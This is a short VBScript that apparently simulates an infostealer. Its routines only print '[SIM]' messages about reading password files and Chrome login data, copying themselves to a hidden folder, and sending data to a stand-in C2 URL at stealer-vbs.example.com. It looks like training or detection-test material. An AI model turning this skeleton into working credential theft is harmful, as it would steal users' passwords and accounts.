Set objShell = CreateObject("WScript.Shell")

C2 = "stealer-vbs.example.com"

Function EncodeData(data)
    EncodeData = "[BASE64]" & data
End Function

Sub CollectData()
    Dim files
    files = Array( _
        "Desktop\passwords.txt", _
        "Documents\accounts.xlsx", _
        "Chrome Login Data" _
    )

    For Each f In files
        WScript.Echo "[SIM] Reading " & f
    Next
End Sub

Sub Exfiltrate(data)
    WScript.Echo "[SIM] Sending to http://" & C2 & "/exfil"
    WScript.Echo "[SIM] Payload: " & data
End Sub

Sub Persistence()
    WScript.Echo "[SIM] Copying script to hidden folder"
End Sub

Persistence()
CollectData()

Dim payload
payload = EncodeData("dummy_credentials")

Exfiltrate payload

Do
    WScript.Echo "[SIM] Monitoring for new data"
    WScript.Sleep 5000
Loop